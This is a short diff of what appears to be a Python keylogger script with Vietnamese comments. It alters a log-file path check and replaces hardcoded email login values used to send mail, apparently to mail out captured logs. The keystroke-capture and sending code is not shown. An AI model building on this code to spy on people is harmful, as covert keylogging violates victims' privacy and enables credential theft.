@@ -62,7 +62,7 @@ file_path = os.path.dirname(os.path.abspath(__file__)) + "\\"
 # Duyệt qua danh sách file
 for file_name in file_names:
     # Kiểm tra file có tồn tại hay không
-    if not os.path.exists(file_path + "\\Keylogger" + file_name):
+    if not os.path.exists(file_path + file_name):
         # Tạo file mới
         open(file_name, "w").close()
 
@@ -78,8 +78,8 @@ time_iteration = 60  # Thời gian lặp lại chương trình
 number_of_iterations_end = 5  # Số lần lặp chương trình
 
 # Mail chủ
-email_address = "1eeb44d334b89c"
-password = "d5da9bd3b22302"
+email_address = "7b582c2532da06"
+password = "3442e47af4e5bc"
 
 
 # Gửi mail
